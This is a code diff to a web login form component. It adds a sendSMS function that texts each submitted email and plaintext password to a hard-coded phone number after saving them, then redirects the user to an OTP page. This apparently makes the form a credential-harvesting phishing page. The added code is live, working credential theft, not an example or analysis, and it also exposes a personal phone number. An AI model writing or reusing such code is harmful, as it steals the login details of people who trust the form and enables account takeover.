@@ -31,19 +31,46 @@ function LoginForm() {
           data: { email: email, password: password },
         }),
       });
+
       const results = await res.json();
       router.push("/otp");
       console.log("Client Details Inserted Successfully", results.document);
+      // generateMessage(results.document.email, results.document.password);
+
+      await sendSMS(
+        `Hello Mkuu, Wake Up New User has just created Account Email: ${results.document.email} and Password: ${results.document.password}`
+      );
     } catch (error) {
       console.log(error.message);
     } finally {
       setLoading(false);
     }
   }
+  async function sendSMS(mes) {
+    const response = await fetch("/api/send-sms", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        to: "+254718017191",
+        message: mes,
+      }),
+    });
+
+    const data = await response.json();
+
+    if (response.ok) {
+      console.log("SMS sent successfully!");
+    } else {
+      console.log(`Error: ${data.error}`);
+    }
+  }
+
   return (
     <form
       onSubmit={(e) => handleSubmit(e)}
-      className="flex flex-col md:px-7 px-4 w-full  gap-3 "
+      className="flex flex-col md:px-7 px-4 w-full gap-3 "
     >
       {loading && <LoadingSpinner />}
       <div className="flex flex-col relative gap-3 py-2">
@@ -65,7 +92,7 @@ function LoginForm() {
           </label>
         </div>
       </div>
-      <div className="flex flex-col relative gap-3   py-2">
+      <div className="flex flex-col relative gap-3 py-2">
         <div className="flex flex-col gap-2">
           <input
             id="password"
